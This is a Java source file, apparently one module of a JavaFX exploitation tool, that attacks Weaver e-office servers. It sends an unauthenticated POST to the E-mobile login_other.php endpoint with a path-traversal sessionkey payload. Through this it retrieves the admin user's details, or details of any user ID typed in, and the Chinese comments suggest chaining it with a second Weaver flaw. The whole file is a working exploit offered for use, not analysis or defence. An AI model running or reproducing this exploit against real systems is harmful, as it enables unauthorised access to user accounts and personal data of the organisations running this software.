package exp.oa.weaveroa.eoffice;

import core.Exploitlnterface;
import javafx.application.Platform;
import javafx.scene.control.TextArea;
import utils.HttpTools;
import utils.Response;
import decrypt.code.getAllEncode;

import java.util.HashMap;

public class weaver_eo_login_other_unauth implements Exploitlnterface {
    @Override
    public Boolean checkVul(String url, TextArea textArea, TextArea textArea_cmd) {
        return att(url, textArea,textArea_cmd);
    }

    @Override
    public Boolean checkVulCmd(String url, String cmd, TextArea textArea, TextArea textArea_cmd) {

        return attcmd(url,cmd, textArea,textArea_cmd);
    }

    @Override
    public Boolean getshell(String url, TextArea textArea) {
        return null;
    }

    private Boolean att(String url, TextArea textArea,TextArea textArea_cmd) {
        try {
            HashMap<String, String> head = new HashMap<>();
            String data = "diff=getuser&id=admin&sessionkey=\\\\..\\\\..\\\\webroot\\\\index.php";
            head.put("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0");
            head.put("Content-Type","application/x-www-form-urlencoded");
            head.put("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");
            Response var = HttpTools.post(url + "/E-mobile/App/System/Login/login_other.php",data , head, "utf-8");
            if (var.getCode() == 200 && var.getText().contains("admin")) {
                Platform.runLater(() -> {
                    textArea.appendText("\n [ weaver_eo_login_other_unauth ]");
                    textArea.appendText("\n 可配合weaver_eo_userselectNew_info漏洞进行利用\nCMD处输入USER_ID内容");
                    textArea.appendText("\n admin信息页面: "+url + "/E-mobile/App/System/Login/login_other.php");
                    textArea_cmd.appendText("\n--------------------------------admin信息------------------------------\n "+ getAllEncode.getU_Decode(var.getText())+
                            "\n-------------------------------------------------------------------------\n");
                    textArea.appendText("\n");
                });

                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }

    private Boolean attcmd(String url,String cmd, TextArea textArea,TextArea textArea_cmd) {
        try {
            HashMap<String, String> head = new HashMap<>();
            String data = "diff=getuser&id="+cmd+"&sessionkey=\\\\..\\\\..\\\\webroot\\\\index.php";
            head.put("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0");
            head.put("Content-Type","application/x-www-form-urlencoded");
            head.put("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8");
            Response var = HttpTools.post(url + "/E-mobile/App/System/Login/login_other.php",data , head, "utf-8");
            if (var.getCode() == 200 && var.getText().contains(cmd)) {
                Platform.runLater(() -> {
                    textArea.appendText("\n "+cmd+"信息页面: "+url + "/E-mobile/App/System/Login/login_other.php");
                    textArea_cmd.appendText("\n--------------------------------"+cmd+"信息------------------------------\n "+ getAllEncode.getU_Decode(var.getText())+
                            "\n-------------------------------------------------------------------------\n");
                    textArea.appendText("\n");
                });

                return true;
            } else {
                Platform.runLater(() -> {
                    textArea.appendText("\n"+cmd+" 人员未找到");
                });
                return false;
            }

        } catch (Exception e) {
            Platform.runLater(() -> {
                textArea.appendText("\n 连接异常！！！");
            });
        }
        return false;
    }
}
